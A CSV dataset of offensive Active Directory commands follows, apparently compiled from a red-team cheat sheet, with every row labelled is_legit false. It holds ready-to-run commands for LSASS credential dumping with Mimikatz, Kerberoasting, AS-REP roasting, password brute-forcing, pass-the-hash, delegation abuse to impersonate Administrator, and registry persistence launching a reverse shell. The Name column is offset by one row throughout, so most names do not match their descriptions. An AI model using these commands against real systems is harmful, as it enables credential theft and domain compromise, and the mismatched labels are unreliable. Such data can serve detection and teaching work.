"Name","description","command","items","OS","attack_types","references","services","is_legit"
"winPEAS","winpeas.exe is a script that will search for all possible paths to escalate privileges on Windows hosts. The below command will run all priv esc checks and store the output in a file.  Command Reference:  	Run all checks: cmd  	Output File: output.txt","winpeas.exe cmd > output.txt","Shell","Windows","PrivEsc","[''https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS''-|-''https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/README.md''-|-''https://book.hacktricks.xyz/windows/windows-local-privilege-escalation'']","","false"
"targetedKerberoast","targetedKerberoast is a Python script that can, like many others (e.g. GetUserSPNs.py), print ""kerberoast"" hashes for user accounts that have a SPN set. This tool brings the following additional feature: for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), print the ""kerberoast"" hash, and delete the temporary SPN set for that operation.  Command Reference:  	Target IP: 10.10.10.1  	Attacker IP: 10.10.10.2  	Domain: test.local  	Username: john  	Password: password123","python3 targetedKerberoast.py -d test.local -u john -p password123 --dc-ip 10.10.10.1","[''Password''-|-''Username'']","Linux","Exploitation","https://github.com/ShutdownRepo/targetedKerberoast","[''Kerberos''-|-''NTLM'']","false"
"lsassy-credsdump","enum4linux-ng is a modern reimplementation of enum4linux written in Python3. It is used to enumerate information from Windows and Samba systems, providing cleaner output and better support for modern protocols. The following command performs a full unauthenticated enumeration of the target.  Command Reference:  	Target IP: 10.10.10.1","enum4linux-ng 10.10.10.1","No_Creds","Linux","Enumeration","https://github.com/cddmp/enum4linux-ng","SMB","false"
"enum4linux-ng","windapsearch enumerates users, groups, and computers from a Windows domain through LDAP queries. The following command enumerates all 3 of the above mentioned using provided credentials.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123  	Enum Users: -U  	Enum Groups: -G  	Enum Domain Admins: --da  	Enum members of group: -m ""Remote Desktop Users""  	Enum Computers and resolve DNS: -C -r","python3 windapsearch --dc-ip 10.10.10.1 -u test.local\\john -p password123 -U -G --da -m ""Remote Desktop Users"" -C -r","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/ropnop/windapsearch''-|-''https://www.attackdebris.com/?p=470'']","","false"
"bloodyAD-Wite-Properties","Snaffler is a tool used to enumerate sensitive data (passwords, PII, etc.) from file shares in Active Directory. It searches for interesting files based on file extensions, file names, and file content that's matched against regex. It's also highly configurable, allowing you to add your own regex searches. The following command will enumerate all machines in the domain and search for accessible file shares, checking for interesting files that might have sensitive data.  Command Reference:  	Domain: test.local  	Domain Controller: 10.10.10.1","Snaffler.exe -s -o snaffler_output.log -d test.local -c 10.10.10.1","Shell","Windows","Enumeration","https://github.com/SnaffCon/Snaffler","SMB","false"
"Windapsearch","SharpWMI.exe is part of the GhostPack suite of tools that provides WMI functionality, such as local/remote WMI queries, remote WMI process creation, and remote execution of arbitrary VBS through WMI events. The following command will simply list all processes running on the local system.  Command Reference:  	Get all processes: ""select * from win32_process""","SharpWMI.exe action=query query=""select * from win32_process""","Shell","Windows","Persistence","[''https://github.com/GhostPack/SharpWMI''-|-''https://www.harmj0y.net/blog/redteaming/ghostpack/'']","WMI","false"
"Snaffler","SharpUp.exe is part of the GhostPack suite of tools and is a C# port of PowerUp that will perform numerous privilege escalation checks. The following command will run all priv esc checks and store the output in a file.  Command Reference:  	Output File: output.txt","SharpUp.exe > output.txt","Shell","Windows","PrivEsc","[''https://github.com/GhostPack/SharpUp''-|-''https://www.harmj0y.net/blog/redteaming/ghostpack/'']","","false"
"SharpWMI","SharpLDAPmonitor.exe allows you to monitor creation, deletion and changes to LDAP objects live during your pentest.  Command Reference:  	Target IP: 10.10.10.1  	Attacker IP: 10.10.10.2  	Domain: test.local  	Username: john  	Password: password123","SharpLDAPmonitor.exe /dcip:10.10.10.1 /user:TEST.local\john /pass:password123","[''Password''-|-''Username'']","Windows","Enumeration","https://github.com/p0dalirius/LDAPmonitor/tree/master/csharp","[''LDAP''-|-''Kerberos''-|-''NTLM'']","false"
"SharpUp","SharpHound.exe is the official data collector for BloodHound, written in C# and uses Windows API functions and LDAP namespace functions to collect data from domain controllers and domain-joined Windows systems. This data can then be fed into BloodHound to enumerate potential paths of privilege escalation. The following command peforms all collection methods and stores the output in a zip file that can be directly placed in the BloodHound GUI.  Command Reference:  	Output File: output.zip","SharpHound.exe --CollectionMethods All --ZipFileName output.zip","Shell","Windows","[''PrivEsc''-|-''Enumeration'']","[''https://github.com/BloodHoundAD/SharpHound3''-|-''https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html'']","","false"
"SharpLDAPmonitor","SharpHound.exe is the official data collector for BloodHound, written in C# and uses Windows API functions and LDAP namespace functions to collect data from domain controllers and domain-joined Windows systems. This data can then be fed into BloodHound to enumerate potential paths of privilege escalation. The following command peforms all collection methods and will use the provided LDAP credentials when performing LDAP collection methods, and stores the output in a zip file that can be directly placed in the BloodHound GUI.  Command Reference:  	LDAP Username: john  	LDAP Password: password123  	Output File: output.zip","SharpHound.exe --CollectionMethod All --LdapUsername john --LdapPassword password123 --ZipFileName output.zip","[''Shell''-|-''Username''-|-''Password'']","Windows","[''PrivEsc''-|-''Enumeration'']","[''https://github.com/BloodHoundAD/SharpHound3''-|-''https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html'']","LDAP","false"
"SharpHound","SharpDump.exe is part of the GhostPack suite of tools and is a C# port of PowerSploit's Out-Minidump.ps1. It can dump the process for LSASS or a specific process given it's PID. This dump can then be fed into mimikatz to extract sensitive information. The following command simply dumps the LSASS process.","SharpDump.exe","Shell","Windows","[''PrivEsc''-|-''Enumeration'']","[''https://github.com/GhostPack/SharpDump''-|-''https://www.harmj0y.net/blog/redteaming/ghostpack/'']","","false"
"SharpHound-LDAP","Seatbelt.exe is part of the GhostPack suite of tools that will perform a lot of ""safety checks"" on the Windows host and collect system data that could be useful for potential privilege escalation or persistence methods. The following command will run all checks on the system and store the output in a file (WARNING: will collect a lot of data. remove `-full` for less output).  Command Reference:  	Run all checks: -group=all  	Output File: output.txt","Seatbelt.exe -group=all -full > output.txt","Shell","Windows","[''PrivEsc''-|-''Persistence'']","[''https://github.com/GhostPack/Seatbelt''-|-''https://www.harmj0y.net/blog/redteaming/ghostpack/'']","","false"
"SharpDump","SafetyKatz.exe is part of the GhostPack suite of tools and is a combination of SharpDump and Mimikatz. The following command will dump the LSASS process and run Mimikatz to extract credentials from the dumped process. Safetykatz also supports a number of mimikatz native commands such as ""sekurlsa::evasive-keys"" etc. The evasive switch in lab and production enviroments up to windows 2016 has been noted to successfully run where the non ""evasive"" switches had not","safetykatz.exe ""privilege::debug"" ""sekurlsa::evasive-logonpasswords"" ""exit""","Shell","Windows","[''PrivEsc''-|-''Enumeration'']","[''https://github.com/GhostPack/SafetyKatz''-|-''https://www.harmj0y.net/blog/redteaming/ghostpack/'']","","false"
"Seatbelt","SMBMap is a tool used to enumerate SMB share drives, including listing share drive permissions, share contents, upload/download functionality, file name enumeration, and remote command execution. The following command will enumerate a list of SMB hosts for accessible SMB shares, both local and mapped drives, using valid credentials.  Command Reference:  	Domain: test.local  	SMB Hosts: smb-hosts.txt  	Username: john  	Password: password123","python3 smbmap.py --host-file smb-hosts.txt -u john -p 'password123' -d test.local -L","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/ShawnDEvans/smbmap''-|-''https://www.nopsec.com/blog/smbmap-wield-it-like-the-creator/'']","SMB","false"
"SafetyKatz","SMBMap is a tool used to enumerate SMB share drives, including listing share drive permissions, share contents, upload/download functionality, file name enumeration, and remote command execution. The following command will enumerate a list of SMB hosts for accessible SMB shares, both local and mapped drives, without credentials (null session).  Command Reference:  	Domain: test.local  	SMB Hosts: smb-hosts.txt","python3 smbmap.py --host-file smb-hosts.txt -d test.local -L","No_Creds","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/ShawnDEvans/smbmap''-|-''https://www.nopsec.com/blog/smbmap-wield-it-like-the-creator/'']","SMB","false"
"SMBMap-Enum-Share","SMBMap is a tool used to enumerate SMB share drives, including listing share drive permissions, share contents, upload/download functionality, file name enumeration, and remote command execution. The following command will enumerate a list of SMB hosts for files and filenames containing the keyword 'password'.  Command Reference:  	Domain: test.local  	SMB Hosts: smb-hosts.txt  	Username: john  	Password: password123","python3 smbmap.py --host-file smb-hosts.txt -u john -p 'password123' -d test.local -F password","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/ShawnDEvans/smbmap''-|-''https://www.nopsec.com/blog/smbmap-wield-it-like-the-creator/'']","SMB","false"
"SMBMap-Enum-Share-Anonymous","Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on the target server using valid credentials.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","smbclient -L \\test.local -I 10.10.10.1 -U john password123","[''Username''-|-''Password'']","Linux","Enumeration","https://www.samba.org/samba/docs/current/man-html/smbclient.1.html","SMB","false"
"SMBMap-Enum-File","Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on the target server using anonymous login.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local","smbclient -L \\test.local -I 10.10.10.1 -N","No_Creds","Linux","Enumeration","https://www.samba.org/samba/docs/current/man-html/smbclient.1.html","SMB","false"
"SMBClient-List-Shares","Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on the target ip using user John hash on test domain.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Hash: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX","smbclient -L \\10.10.10.1 -U test.local/john --pw-nt-hash XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX","[''Username''-|-''Hash'']","Linux","Enumeration","https://www.samba.org/samba/docs/current/man-html/smbclient.1.html","SMB","false"
"SMBClient-List-Shares-Anonymous","Smbclient is a tool used to communicate with SMB servers. The following command will connect to an SMB share `C$` using valid credentials.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	SMB Share: C$  	Username: john  	Password: password123","smbclient \\\\test.local\\C$ -I 10.10.10.1 -U john password123","[''Username''-|-''Password'']","Linux","Enumeration","[''https://www.samba.org/samba/docs/current/man-html/smbclient.1.html''-|-''https://www.madirish.net/59'']","SMB","false"
"SMBClient-List-Share-PTH","Smbclient is a tool used to communicate with SMB servers. The following command will connect to an SMB share `public` using anonymous login.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	SMB Share: public","smbclient \\\\test.local\\public -I 10.10.10.1 -N","No_Creds","Linux","Enumeration","[''https://www.samba.org/samba/docs/current/man-html/smbclient.1.html''-|-''https://www.madirish.net/59'']","SMB","false"
"SMBClient-Enum-Share","Rubeus' `s4u` module performs Kerberos constrained delegation attacks using the S4U2Self and S4U2Proxy. This technique abuses accounts configured with delegation privileges (msDS-AllowedToDelegateTo) to impersonate any domain user and further alter the service specified since SPNs are stored in plaintext and thus access any service on the target system as any user  Command Reference:  	Domain: test.local    SPN: time/dc.test.local    alternative service: ldap(can chose any valid services such as HTTP for remoting access)  	Username: john$  	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7","Rubeus.exe s4u /user:john$ /aes256:2a3de7fe356ee524cc9f3d579f2e0aa7 /impersonateuser:Administrator /msdsspn:time/dc.test.local /altservice:ldap /ptt","[''Hash''-|-''Username''-|-''target''-|-''service'']","Windows","[''Exploitation''-|-''Lateral Movement''-|-''Privilidge Escalation'']","[''https://github.com/GhostPack/Rubeus''-|-''https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/constrained-delegation''-|-''https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation'']","Kerberos","false"
"SMBClient-Enum-Share-Anonymous","Rubeus' `kerberoast` module will attempt to fetch Service Principal Names that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account's password, which can then be bruteforced offline. The following command is run on a Windows machine in the victim domain.  Command Reference:  	Output File: hashes.txt","Rubeus.exe kerberoast /outfile:hashes.txt","Shell","Windows","[''Exploitation''-|-''PrivEsc'']","[''https://github.com/GhostPack/Rubeus''-|-''https://github.com/GhostPack/Rubeus#kerberoast'']","Kerberos","false"
"Rubeus-s4u","Rubeus' `brute` module bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to brute force valid username and passwords logins given a list of usernames and a list of passwords.  Command Reference:  	Domain: test.local  	Username List: usernames.txt  	Password List: passwords.txt  	Output File: found_passwords.txt","Rubeus.exe /users:usernames.txt /passwords:passwords.txt /domain:test.local /outfile:found_passwords.txt","No_Creds","Windows","Enumeration","[''https://github.com/GhostPack/Rubeus''-|-''https://github.com/GhostPack/Rubeus#brute'']","Kerberos","false"
"Rubeus-Kerberoast","Rubeus' `asktgt` module uses a valid user's NTLM hash to request Kerberos tickets, in order to access any service or machine where that user has permissions.  Command Reference:  	Domain: test.local  	Username: john  	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7","Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt","[''Hash''-|-''Username'']","Windows","Exploitation","[''https://github.com/GhostPack/Rubeus''-|-''https://github.com/GhostPack/Rubeus#asktgt'']","Kerberos","false"
"Rubeus-Brute","Rubeus' `asreproast` module will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will be encrypted with the user's password, which can then be cracked offline. The following command is run on a Windows machine in the victim domain.  Command Reference:  	Output File: hashes.txt","Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt","Shell","Windows","[''Exploitation''-|-''PrivEsc'']","[''https://github.com/GhostPack/Rubeus''-|-''https://github.com/GhostPack/Rubeus#asreproast'']","Kerberos","false"
"Rubeus-AskTGT","Responder is an LLMNR, NBT-NS, and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool will only answer to File Server Service request, which is for SMB. The following command will put Responder in analyze mode, listening for NBT-NS, BROWSER, and LLMNR requests without responding.  Command Reference:  	Interface: eth0","Responder -I eth0 -A","No_Creds","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/lgandx/Responder''-|-''https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/'']","[''NTLM''-|-''SMB'']","false"
"Rubeus-ASREPRoast","It is possible to gain persistence on a windows machine by adding reg keys that will execute an arbitrary payload during logon or startup. Keys added to the HKLM hive will execute on startup. Keys added to the HKCU hive will execute when the corresponding user logs on. Adding keys into the HKLM hive will require an elevated shell. There are four keys that can be used: Run, RunOnce, RunServices, and RunServicesOnce. By default, a RunOnce key is deleted after the specified command is executed. The path for these keys is the same for the HKLM and HKCU hives.  Command Reference:  	Value Name: Persistence  	RegKey data type: REG_SZ  	Data: ""C:\Path\To\revshell.exe""  	KeyName: ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run""","reg.exe add ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"" /v Persistence /t REG_SZ /d ""C:\Path\To\revshell.exe""  reg.exe add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"" /v Persistence /t REG_SZ /d ""C:\Path\To\revshell.exe""","Shell","Windows","Persistence","[''https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/''-|-''https://www.hackingarticles.in/windows-persistence-using-winlogon/''-|-''https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg''-|-''https://docs.microsoft.com/en-us/windows-hardware/drivers/install/runonce-registry-key'']","","false"
"Responder-Analyze","rpcclient is a tool used for executing client side MS-RPC functions to manage Windows NT clients from Unix workstatios. From an offensive security standpoint, it can be used to enumerate users, groups, and other potentially sensitive information. The following command attempt to connect to the NetBIOS server anonymously, in order to enumerate using MS-RPC available commands/functions.  Command Reference:  	Target IP: 10.10.10.1","rpcclient -U '' -N 10.10.10.1","No_Creds","Linux","Enumeration","[''https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html''-|-''https://www.ired.team/offensive-security/enumeration-and-discovery/enumerating-windows-domains-using-rpcclient-through-socksproxy-bypassing-command-line-logging'']","RPC","false"
"Regexe-Persistence","pyWhisker is a tool allowing users to manipulate the msDS-KeyCredentialLink attribute of a target user/computer to obtain full control over that object. It's based on Impacket and on our Python equivalent of Michael Grafnetter's DSInternals called PyDSInternals. This tool, along with Dirk-jan's PKINITtools allow for a complete primitive exploitation on UNIX-based systems only.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 pywhisker.py -d ""test.local"" -u ""john"" -p ""password123"" --target ""user2"" --action ""list"" --dc-ip ""10.10.10.1""","[''Password''-|-''Username'']","Linux","Exploitation","https://github.com/shutdownrepo/pywhisker","Kerberos","false"
"RPCClient-Anonymous","ldapmonitor.py allows you to monitor creation, deletion and changes to LDAP objects live during your pentest.  Command Reference:  	Target IP: 10.10.10.1  	Attacker IP: 10.10.10.2  	Domain: test.local  	Username: john  	Password: password123","python3 ldapmonitor.py -u 'john' -d 'TEST.local' -p 'password123' --dc-ip 10.10.10.1","[''Password''-|-''Username''-|-''Hash'']","Linux","Enumeration","https://github.com/p0dalirius/LDAPmonitor/tree/master/python","[''LDAP''-|-''Kerberos''-|-''NTLM'']","false"
"PyWhisker","These commands provide a quick refernece for using the AD module to get situational awerness of the AD environment. Note that to get more commands that you can run, use the get command cmdlet, e.g. `Get-Command -Module ActiveDirectory` But Thes are the standard commands that will get you standard. Feel free to replace the first pipe with the -server ""your domain"" if you dont want to enumarate the entire forest. For more info on using the AD module, please check out our discussion on the AD module in WADCOMs.","#Getting all DCs in the forest (Get-ADForest).Domains | % { Get-ADDomainController -DomainName $_ -Discover }  #Getting all users in the forest (Get-ADForest).Domains | % { Get-ADUser -Filter * -Server $_ }  #Getting all computers in the forest (Get-ADForest).Domains | % { Get-ADComputer -Filter * -Server $_ }  #Mapping out entire trust relationships Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' | Select-Object Source,Target,Name  #Getting all groups in a domain. Note that the select statement will limit the output to only the matching fields the object contains Get-ADGroup -Filter * | Select-Object SamAccountName, GroupScope, DistinguishedName","","Windows","Enumeration","[''https://docs.microsoft.com/en-us/powershell/module/activedirectory/''-|-''https://github.com/samratashok/ADModule'']","","false"
